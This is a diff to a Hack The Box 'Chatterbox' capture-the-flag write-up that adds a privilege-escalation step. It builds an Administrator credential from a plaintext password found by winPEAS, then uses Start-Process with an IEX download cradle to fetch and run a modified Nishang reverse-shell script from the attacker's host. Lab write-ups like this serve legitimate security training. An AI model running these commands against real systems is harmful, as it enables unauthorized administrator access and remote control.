@@ -67,4 +67,24 @@ Catch shell:
 
 Winpeas finds creds:
 
-![creds](C:\Users\kevinkim\Documents\Repos\HTB\writeups\chatterbox\creds.png)
+![creds](./chatterbox/creds.png)
+
+**<u>Priv Esc:</u>**
+
+```bash
+PS C:\users\alfred\desktop> $SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force 
+
+PS C:\users\alfred\desktop> $cred = New-ObjectSystem.Management.Automation.PSCredential('Administrator', $SecPass) 
+
+PS C:\users\alfred\desktop> $cred
+
+#on kali
+#download https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+kali@kali:~/Documents/htb/chatterbox$ mv Invoke-PowerShellTcp.ps1 bchat.txt
+
+#modify the bchat to own server
+kali@kali:~/Documents/htb/chatterbox$ cp bchat.txt ./cchat.ps1
+
+PS C:\users\alfred\desktop> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.27/cchat.ps1')" -Credential $cred
+```
+
